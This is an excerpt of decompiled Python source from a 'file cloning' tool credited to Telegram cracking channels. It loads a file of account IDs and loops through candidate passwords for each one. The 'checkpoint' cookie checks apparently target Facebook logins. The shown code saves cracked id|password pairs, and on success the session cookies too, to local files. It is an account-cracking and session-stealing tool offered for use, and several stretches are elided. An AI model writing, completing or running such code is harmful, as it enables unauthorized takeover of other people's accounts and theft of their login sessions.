# --> Done Decoded By <⏤͟͞𝗝𝗢𝗞𝗘𝗥 🇵🇰> <\> DecodeX+
# --> Encryption </> PYTHON 3.11
# --> Follow me on Telegram as @Theyhates_joker
# --> Developed By :  @JokerPy
...
--------------------〔7ABXOR TOOLS 〕-------------
TELGRAM : @i603D
CHANNEL : @satwr_CRACK404
VERSION : 1.0
NEW TOOL FILE CLONING 
---------------------〔7ABXOR TOOLS 〕------------""")
...
def FILE():
			...
			try:
				print('')
				print('')
				print('        \033[1;96m   PUT FILE         ')
				print('')
				fileX = input (' \033[1;96mNAME FILE  = ');os.system('clear');banner()
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				setting()
			except IOError:
				exit(" \033[1;37mFILE ERROR [!]"%(fileX))
def setting():
	os.system('clear')
	banner()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r \033 [7ABXOR]   {P}{H}{loop} \033[1;34m{P}{P}{H}=\033[1;34m {ok}\033[1;34m{P} \033[1;34m "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033 [7ABXOR]〔CP〕\033[1;37m  {idf}\033[1;37m |\033[1;37m {pw}')
				...
				print(f'\r\033[7ABXOR]〔OK〕\033[1;34m  {idf} \033[1;34m| \033[1;34m{pw}')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='7ABXOR-CP'))
					open('/sdcard/7ABXOR/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/7ABXOR/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='7ABXOR-OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]7ABXOR-OK[/bold green]'))
					ok+=1
					break
